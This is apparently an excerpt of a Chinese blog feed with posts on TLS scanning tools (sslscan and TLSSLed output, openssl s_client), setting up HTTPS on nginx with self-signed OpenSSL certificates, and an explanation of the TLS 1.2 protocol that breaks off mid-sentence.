https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256       -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384           ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         RSA_WITH_AES_256_CCM                              -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_256_CBC_SHA256                   -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384             ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         ECDHE_ECDSA_WITH_AES_256_CCM                      -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384           ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA              ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384             ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256     -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         ECDHE_ECDSA_WITH_AES_256_CCM_8                    -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_256_CBC_SHA                      -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_256_GCM_SHA384                   -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA              ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         RSA_WITH_AES_128_CCM_8                            -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         ECDHE_ECDSA_WITH_AES_128_CCM                      -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         RSA_WITH_AES_128_CCM                              -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         ECDHE_ECDSA_WITH_AES_128_CCM_8                    -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256             ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_128_CBC_SHA                      -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_128_CBC_SHA256                   -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256           ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_128_GCM_SHA256                   -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256             ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256           ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                  SCAN COMPLETED IN 7.29 S<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-TLSSLed"><a href="#6-TLSSLed" class="headerlink" title="6 TLSSLed"></a>6 TLSSLed</h2><p>该工具是基于sslscan的脚本工具，使用非常简单。用户可以一次性执行所有检测任务，并且会生成详细的日志文件。它可以检测支持的协议类型、空密码和弱密码以及强密码等功能。</p><pre><code>[root@localhost ~]# yum install tlssled[root@localhost ~]# tlssled [ip/domain] 443</code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localname ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tlssled www.baidu.com 443</span>------------------------------------------------------ TLSSLed - <span class="token punctuation">(</span>1.3<span class="token punctuation">)</span> based on sslscan and openssl                 by Raul Siles <span class="token punctuation">(</span>www.taddong.com<span class="token punctuation">)</span>------------------------------------------------------    openssl version: OpenSSL 1.1.1g  21 Apr 2020    sslscan version 1.10.2 ------------------------------------------------------    Date: 20200821-110138------------------------------------------------------<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Analyzing SSL/TLS on www.baidu.com:443 <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Output directory: TLSSLed_1.3_www.baidu.com_443_20200821-110138 <span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking <span class="token keyword">if</span> the target <span class="token function">service</span> speaks SSL/TLS<span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> The target <span class="token function">service</span> www.baidu.com:443 seems to speak SSL/TLS<span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Using SSL/TLS protocol version:         <span class="token punctuation">(</span>empty means I'm using the default openssl protocol version<span class="token punctuation">(</span>s<span class="token punctuation">))</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running sslscan on www.baidu.com:443 <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> SSLv2 <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> the NULL cipher <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> weak ciphers <span class="token punctuation">(</span>based on key length - 40 or 56 bits<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> strong ciphers <span class="token punctuation">(</span>based on AES<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    Accepted  TLSv1  256 bits  ECDHE-RSA-AES256-SHA    Accepted  TLSv1  256 bits  AES256-SHA    Accepted  TLSv1  128 bits  ECDHE-RSA-AES128-SHA    Accepted  TLSv1  128 bits  AES128-SHA    Accepted  TLS11  256 bits  ECDHE-RSA-AES256-SHA    Accepted  TLS11  256 bits  AES256-SHA    Accepted  TLS11  128 bits  ECDHE-RSA-AES128-SHA    Accepted  TLS11  128 bits  AES128-SHA    Accepted  TLS12  256 bits  ECDHE-RSA-AES256-SHA    Accepted  TLS12  256 bits  AES256-SHA    Accepted  TLS12  128 bits  ECDHE-RSA-AES128-GCM-SHA256    Accepted  TLS12  128 bits  ECDHE-RSA-AES128-SHA    Accepted  TLS12  128 bits  AES128-SHA    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> MD5 signed certificate <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> the certificate public key length <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> the certificate subject <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> the certificate CA issuer <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> the certificate validity period <span class="token punctuation">..</span>.    Today: Fri Aug 21 03:02:05 UTC 2020    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Checking preferred server ciphers <span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> SSL/TLS renegotiation MitM vuln. <span class="token punctuation">(</span>CVE-2009-3555<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> secure renegotiation support <span class="token punctuation">(</span>RFC 5746<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    Secure Renegotiation IS supported<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> SSL/TLS renegotiation DoS vuln. <span class="token punctuation">(</span>CVE-2011-1473<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> client initiated <span class="token punctuation">(</span>CI<span class="token punctuation">)</span> SSL/TLS renegotiation <span class="token punctuation">(</span>secure<span class="token punctuation">)</span><span class="token punctuation">..</span>.    <span class="token punctuation">(</span>CI<span class="token punctuation">)</span> SSL/TLS renegotiation IS NOT enabled <span class="token punctuation">(</span>no renegotiation<span class="token punctuation">)</span>    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> client initiated <span class="token punctuation">(</span>CI<span class="token punctuation">)</span> SSL/TLS renegotiation <span class="token punctuation">(</span>insecure<span class="token punctuation">)</span><span class="token punctuation">..</span>.    <span class="token punctuation">(</span>CI<span class="token punctuation">)</span> SSL/TLS renegotiation IS NOT enabled <span class="token punctuation">(</span>no renegotiation<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> client authentication using digital certificates <span class="token punctuation">..</span>.    SSL/TLS client certificate authentication IS NOT required<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> TLS v1.1 and v1.2 <span class="token punctuation">(</span>CVE-2011-3389 vuln. aka BEAST<span class="token punctuation">)</span> <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> SSLv3 and TLSv1 support <span class="token punctuation">..</span>.    Accepted  SSLv3  112 bits  RC4-SHA    Accepted  TLSv1  256 bits  ECDHE-RSA-AES256-SHA    Accepted  TLSv1  256 bits  AES256-SHA    Accepted  TLSv1  128 bits  ECDHE-RSA-AES128-SHA    Accepted  TLSv1  128 bits  AES128-SHA    Accepted  TLSv1  112 bits  ECDHE-RSA-RC4-SHA    Accepted  TLSv1  112 bits  RC4-SHA    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> RC4 <span class="token keyword">in</span> the prefered cipher<span class="token punctuation">(</span>s<span class="token punctuation">)</span> list <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> TLS v1.1 support <span class="token punctuation">..</span>.    TLS v1.1 IS supported    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> TLS v1.2 support <span class="token punctuation">..</span>.    TLS v1.2 IS supported<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> HTTPS <span class="token punctuation">(</span>SSL/TLS<span class="token punctuation">)</span> security headers using HTTP/1.0 <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> HTTP Strict-Transport-Security <span class="token punctuation">(</span>HSTS<span class="token punctuation">)</span> header <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> cookies with the secure flag <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> cookies without the secure flag <span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> HTTPS <span class="token punctuation">(</span>SSL/TLS<span class="token punctuation">)</span> security headers using HTTP/1.1 <span class="token operator">&amp;</span> Host <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> HTTP Strict-Transport-Security <span class="token punctuation">(</span>HSTS<span class="token punctuation">)</span> header <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> cookies with the secure flag <span class="token punctuation">..</span>.    <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Testing <span class="token keyword">for</span> cookies without the secure flag <span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> New files created:    <span class="token punctuation">[</span>.<span class="token punctuation">]</span> Output directory: TLSSLed_1.3_www.baidu.com_443_20200821-110138 <span class="token punctuation">..</span>.openssl_HEAD_1.0_www.baidu.com_443_20200821-110138.err    openssl_HEAD_www.baidu.com_443_20200821-110138.log        openssl_RENEG_www.baidu.com_443_20200821-110138.erropenssl_HEAD_1.0_www.baidu.com_443_20200821-110138.log    openssl_RENEG_LEGACY_www.baidu.com_443_20200821-110138.err  openssl_RENEG_www.baidu.com_443_20200821-110138.logopenssl_HEAD_www.baidu.com_443_20200821-110138.err    openssl_RENEG_LEGACY_www.baidu.com_443_20200821-110138.log  sslscan_www.baidu.com_443_20200821-110138.log<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-openssl"><a href="#7-openssl" class="headerlink" title="7 openssl"></a>7 openssl</h2><pre><code> openssl s_client -connect www.baidu.com:443　　【s_client:作为一个客户端 -connect：连接 +服务器域名:端口】 </code></pre><p><img src="/2020/08/26/htps-tools/1598432415793.png" alt="1598432415793"></p><p><img src="/2020/08/26/htps-tools/1596439698251.png" alt="1596439698251"></p><h2 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h2><p> <a href="https://blog.csdn.net/qq_42696904/article/details/85267927?utm_medium=distribute.pc_relevant.none-task-blog-baidulandingword-1&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/qq_42696904/article/details/85267927?utm_medium=distribute.pc_relevant.none-task-blog-baidulandingword-1&amp;spm=1001.2101.3001.4242</a> </p><p> <a href="https://github.com/nabla-c0d3/sslyze">https://github.com/nabla-c0d3/sslyze</a> </p><p> <a href="https://nabla-c0d3.github.io/sslyze/documentation/">https://nabla-c0d3.github.io/sslyze/documentation/</a> </p><p> <a href="https://www.freebuf.com/sectool/99151.html">https://www.freebuf.com/sectool/99151.html</a> </p><p> <a href="https://www.infinisign.com/faq/tls-ssl-security-testing">https://www.infinisign.com/faq/tls-ssl-security-testing</a> </p><p> <a href="https://testssl.sh/">https://testssl.sh/</a> </p>]]></content>
      
      
      
        <tags>
            
            <tag> TLS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建https网站</title>
      <link href="/2020/08/26/htps-build/"/>
      <url>/2020/08/26/htps-build/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>环境：centos 7</p><p>nginx 版本：1.19.1</p><a id="more"></a><h2 id="1-安装nginx"><a href="#1-安装nginx" class="headerlink" title="1 安装nginx"></a>1 安装nginx</h2><p>按照 <a href="https://www.runoob.com/linux/nginx-install-setup.html">https://www.runoob.com/linux/nginx-install-setup.html</a> 教程安装即可，记得安装最新版。</p><pre><code>wget http://nginx.org/download/nginx-1.19.1.tar.gz</code></pre><p>nginx安装目录配置 nginx.conf 如下：/usr/local/webserver/nginx/conf</p><h2 id="2-自签名证书"><a href="#2-自签名证书" class="headerlink" title="2 自签名证书"></a>2 自签名证书</h2><h3 id="2-1-CA根证书的生成步骤"><a href="#2-1-CA根证书的生成步骤" class="headerlink" title="2.1 CA根证书的生成步骤"></a>2.1 CA根证书的生成步骤</h3><p>新建一个文件夹ssl</p><pre><code>mkdir sslcd ssl</code></pre><h4 id="2-1-1-生成私钥"><a href="#2-1-1-生成私钥" class="headerlink" title="2.1.1 生成私钥"></a>2.1.1 <strong>生成私钥</strong></h4><p>生成CA私钥（.key）–&gt;生成CA证书请求（.csr）–&gt;自签名得到根证书（.crt）（CA给自已颁发的证书）。</p><pre class="line-numbers language-csharp"><code class="language-csharp"><span class="token preprocessor property"># Generate CA private key </span>openssl genrsa <span class="token operator">-</span><span class="token keyword">out</span> ca<span class="token punctuation">.</span>key <span class="token number">2048</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/08/26/htps-build/1597046435726.png" alt="1597046435726"></p><h4 id="2-1-2-生成证书请求文件"><a href="#2-1-2-生成证书请求文件" class="headerlink" title="2.1.2   生成证书请求文件"></a>2.1.2   <strong>生成证书请求文件</strong></h4><p> 这个过程会要求输入很多信息如国家、城市、组织信息等，其中 <code>Common Name (eg, your name or your server&#39;s hostname)</code> 是 <strong>必填项</strong> ，可以是域名或者 IP，其他都可以回车跳过，但是这样的话在签名证书时候会报错，下一章详述，不过自签名证书不影响。 </p><pre><code># Generate CSR openssl req -new -key ca.key -out ca.csr</code></pre><p><img src="/2020/08/26/htps-build/1597046507003.png" alt="1597046507003"></p><h4 id="2-1-3-生成自签名证书"><a href="#2-1-3-生成自签名证书" class="headerlink" title="2.1.3    生成自签名证书"></a>2.1.3    <strong>生成自签名证书</strong></h4><pre><code># Generate Self Signed certificate（CA 根证书）openssl x509 -req -days 365 -in ca.csr -signkey ca.key -out ca.crt</code></pre><p><img src="/2020/08/26/htps-build/1597046586371.png" alt="1597046586371"></p><h3 id="2-2-用户证书的生成步骤"><a href="#2-2-用户证书的生成步骤" class="headerlink" title="2.2 用户证书的生成步骤"></a>2.2 用户证书的生成步骤</h3><h4 id="2-2-1-生成私钥"><a href="#2-2-1-生成私钥" class="headerlink" title="2.2.1. 生成私钥"></a><strong>2.2.1. 生成私钥</strong></h4><p>生成私钥（.key）–&gt;生成证书请求（.csr）–&gt;用CA根证书签名得到证书（.crt）</p><p>服务器端用户证书：</p><pre class="line-numbers language-html"><code class="language-html"># private key$openssl genrsa -des3 -out server.key 1024 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/08/26/htps-build/1597046728463.png" alt="1597046728463"></p><h4 id="2-2-2-生成证书请求"><a href="#2-2-2-生成证书请求" class="headerlink" title="2.2.2 生成证书请求"></a>2.2.2 生成证书请求</h4><pre><code># generate csr$openssl req -new -key server.key -out server.csr</code></pre><p><img src="/2020/08/26/htps-build/1597046781761.png" alt="1597046781761"></p><h4 id="2-2-3-生成证书（根证书对用户的证书请求签名，最终生成用户证书）"><a href="#2-2-3-生成证书（根证书对用户的证书请求签名，最终生成用户证书）" class="headerlink" title="2.2.3  生成证书（根证书对用户的证书请求签名，最终生成用户证书）"></a>2.2.3  <strong>生成证书（根证书对用户的证书请求签名，最终生成用户证书）</strong></h4><p> 使用 <code>x509</code> 工具生成证书，因为它默认不使用 <code>openssl.cnf</code> </p><pre><code># generate certificate$openssl x509 -req -in server.csr -CA ca.crt \ -CAkey ca.key -out server.crt -CAcreateserial</code></pre><p><img src="/2020/08/26/htps-build/1597046922337.png" alt="1597046922337"></p><h4 id="2-2-4-验证证书有效性"><a href="#2-2-4-验证证书有效性" class="headerlink" title="2.2.4  验证证书有效性"></a>2.2.4  验证证书有效性</h4><pre><code>openssl verify -CAfile ca.crt server.crt</code></pre><p><img src="/2020/08/26/htps-build/1597047002938.png" alt="1597047002938"></p><h4 id="2-2-5-导出证书"><a href="#2-2-5-导出证书" class="headerlink" title="2.2.5 导出证书"></a>2.2.5 导出证书</h4><pre><code>cat server.crt server.key &gt; server.pem</code></pre><p><img src="/2020/08/26/htps-build/1597047735585.png" alt="1597047735585"></p><h2 id="3-配置nginx"><a href="#3-配置nginx" class="headerlink" title="3 配置nginx"></a>3 配置nginx</h2><p>将openssl生成的证书文件复制到nginx的目录下：</p><pre><code>[root@localname ~]#  cp -r ssl  /usr/local/webserver/nginx/conf/ssl</code></pre><h4 id="3-1-1-配置nginx-conf文件"><a href="#3-1-1-配置nginx-conf文件" class="headerlink" title="3.1.1 配置nginx.conf文件"></a>3.1.1 配置nginx.conf文件</h4><p>配置/usr/local/webserver/nginx/conf目录下的nginx.conf文件</p><pre><code>vim  /usr/local/webserver/nginx/conf/nginx.conf</code></pre><p>修改文件如下：</p><p><img src="/2020/08/26/htps-build/1597047296881.png" alt="1597047296881"></p><pre><code>server  &#123;    listen 443;#监听端口    server_name 192.168.10.136;#域名    index index.html index.htm index.php;    root /usr/local/webserver/nginx/html;#站点目录   #注意这些路径是相对于/etc/nginx/nginx.conf文件位置    ssl on;    ssl_certificate ssl/server.crt;    ssl_certificate_key ssl/server.key;    ssl_session_timeout 5m;    ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #按照这个协议配置    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;#按照这个套件配置    ssl_prefer_server_ciphers on;    location ~ .*\.(php|php5)?$    &#123;      #fastcgi_pass unix:/tmp/php-cgi.sock;      fastcgi_pass 127.0.0.1:9000;      fastcgi_index index.php;      include fastcgi.conf;    &#125;    location ~ .*\.(gif|jpg|jpeg|png|bmp|swf|ico)$    &#123;      expires 30d;  # access_log off;    &#125;    location ~ .*\.(js|css)?$    &#123;      expires 15d;   # access_log off;    &#125;    access_log off;  &#125;</code></pre><h4 id="3-1-2-测试-停止-重启nginx服务"><a href="#3-1-2-测试-停止-重启nginx服务" class="headerlink" title="3.1.2  测试 /停止/重启nginx服务"></a>3.1.2  测试 /停止/重启nginx服务</h4><p>编译/usr/local/webserver/nginx/sbin/nginx  -t</p><p><img src="/2020/08/26/htps-build/1597044719436.png" alt="1597044719436"></p><p>重启  nginx：/usr/local/webserver/nginx/sbin/nginx  -s stop</p><p>启动：/usr/local/webserver/nginx/sbin/nginx</p><p>浏览器输入（本机ip地址）：<a href="https://192.168.10.136/">https://192.168.10.136/</a></p><p><img src="/2020/08/26/htps-build/1597044598226.png" alt="1597044598226"></p><p><img src="/2020/08/26/htps-build/1597044868039.png" alt="1597044868039"></p><p>这时候发现浏览器提示不安全的链接,这个时候将根证书ca.crt导入浏览器,重启,发现提示消失了.</p><h2 id="4-nginx日常操作命令"><a href="#4-nginx日常操作命令" class="headerlink" title="4 nginx日常操作命令"></a>4 nginx日常操作命令</h2><p>nginx -t 测试配置文件<br>nginx -s reload 修改配置后重载生效<br>nginx -s reopen 重新打开日志文件<br>nginx -s stop 快速停止<br>nginx -s quit</p><p>查看nginx进程<br>ps -ef | grep nginx</p><h2 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h2><p><a href="https://www.gokuweb.com/operation/d95eae05.html">https://www.gokuweb.com/operation/d95eae05.html</a><br><a href="https://blog.csdn.net/liuchunming033/article/details/48470575">https://blog.csdn.net/liuchunming033/article/details/48470575</a> </p><p><a href="https://juejin.im/post/6844903729632641031">https://juejin.im/post/6844903729632641031</a> </p>]]></content>
      
      
      
        <tags>
            
            <tag> TLS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>竟然有人能把https/TLS1.2协议讲的这么详细</title>
      <link href="/2020/08/26/apple/"/>
      <url>/2020/08/26/apple/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-https"><a href="#1-https" class="headerlink" title="1  https"></a>1  https</h2><p><strong>SSL</strong>(Secure Sockets Layer) 安全套接层，是一种安全协议，经历了 SSL 1.0、2.0、3.0 版本后发展成了标准安全协议 - <strong>TLS</strong>(Transport Layer Security) 传输层安全性协议。TLS 有 1.0 (RFC 2246)、1.1(RFC 4346)、1.2(RFC 5246)、1.3(RFC 8446) 版本。</p><a id="more"></a><img src="/2020/08/26/apple/1597202957092.png" alt="1597202957092" style="zoom: 50%;"><h3 id="1-1-安全协议必备元素"><a href="#1-1-安全协议必备元素" class="headerlink" title="1.1 安全协议必备元素"></a>1.1 安全协议必备元素</h3><p>在一个不安全的信道传输，我们需要保证三点:</p><p>(1)一是保证数据来源可靠性(身份认证)及在通信过程中数据的完整性（防篡改和防伪造），有数字签名和HMAC两种做法。数字签名是用私钥对报文进行签名生成数字签名，然后公钥对数字签名进行验证，常见的有SM2，RSA等；HMAC是通信两边用同一个密钥，运行常见的哈希函数MD5，SHA-1等进行哈希运算生成字符串，然后两边生成的字符串进行比较。具体细节，请参见XXXXXXXXX。</p><p>(2)另外一种是保证数据机密性，即对数据进行加密传输，加密算法分为对称算法和非对称算法，非对称算法有两个密钥，公钥加密，私钥解密，安全性较高，但加解密速度较慢，例如RSA加密算法；对称算法只有一个密钥，对称算法又分流加密（CR4等）和分组密码算法（AES，3DES等），流加密速度更快，相比于非对称加密，对称算法加解密速度较快，安全性较低。</p><p>(3)防重放:加入新鲜因子,随机数等.</p><img src="/2020/08/26/apple/1597634074757.png" alt="1597634074757" style="zoom: 67%;"><p>因此通常一个安全协议的设计需要满足基础三点，保证数据完整性（防篡改）和机密性，综合效率及安全性分析，通常的做法是将对称算法与非对称算法结合使用，即利用非对称算法协商出一个会话密钥，然后会话密钥作为对称算法的密钥进行加密，HMAC运行。</p><h3 id="1-2-TSL-协议体系结构"><a href="#1-2-TSL-协议体系结构" class="headerlink" title="1.2 TSL 协议体系结构"></a>1.2 TSL 协议体系结构</h3><img src="/2020/08/26/apple/1597635119718.png" alt="1597635119718" style="zoom:80%;"><p>TLS的体系结构中包含两个协议子层，其中底层是SSL记录协议层（SSL Record Protocol Layer）；高层是SSL握手协议层（SSL HandShake Protocol Layer）。</p><p>TLS协议主要分为两层：</p><p>(1) TLS记录协议层的作用是为高层协议提供基本的安全服务。TLS记录协议针对HTTP协议进行了特别的设计，使得超文本的传输协议HTTP能够在TLS运行。纪录封装各种高层协议，具体实施压缩解压缩、加密解密、计算和校验MAC等与安全有关的操作。</p><p>(2) TLS握手协议层包括握手协议（HandShake Protocol）、密码参数修改协议（Change Cipher Spec Protocol）和告警协议（Alert Protocol）。握手层的这些协议用于管理信息的交换，允许应用协议传送数据之间相互验证，协商加密算法和生成密钥等。</p><p>其中最重要的是记录协议和握手协议：</p><p>(1) TLS记录协议：它建立在可靠的传输（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能。</p><p>(2) TLS握手协议：它建立在TLS记录协议之上，用于在实际的数据传输开始之前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。</p><p>如下图所示,可以看到TLS握手层是建立在TLS记录层之上的。</p><p><img src="/2020/08/26/apple/1597635346378.png" alt="1597635346378"></p><h3 id="1-3-TLS密码套件结构"><a href="#1-3-TLS密码套件结构" class="headerlink" title="1.3 TLS密码套件结构"></a>1.3 TLS密码套件结构</h3><p><img src="/2020/08/26/apple/1597654968578.png" alt="1597654968578"></p><p>密码套件是客户端与服务器约定交互过程中需要的密码算法系列，如上图所示，以TLS开头，</p><p>（1）第一个参数为密钥交换算法，即协商预主密钥pre-master 